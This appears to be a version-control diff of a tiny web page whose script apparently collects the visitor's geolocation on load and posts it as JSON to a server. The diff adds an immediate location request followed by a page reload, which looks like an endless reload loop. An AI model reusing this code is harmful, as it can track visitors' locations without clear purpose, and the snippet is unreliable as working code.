@@ -1,12 +1,6 @@
 <!DOCTYPE html>
 <html>
-<body>
-
-
-
-
-<p id="demo"></p>
-
+    
 <script>
 
     
@@ -37,17 +31,20 @@ function showPosition(position) {
         body: JSON.stringify(data)
       })
 }
-        getLocation()
-window.onload=()=>{
-     window.setTimeout(()=>{
-                getLocation()
 
-    },2000)
-}
-   
-   
+  getLocation() 
+   window.location.reload();
+
 
 </script>
+<body>
+
+
+
+
+<p id="demo"></p>
+
+
 
 </body>
 </html>
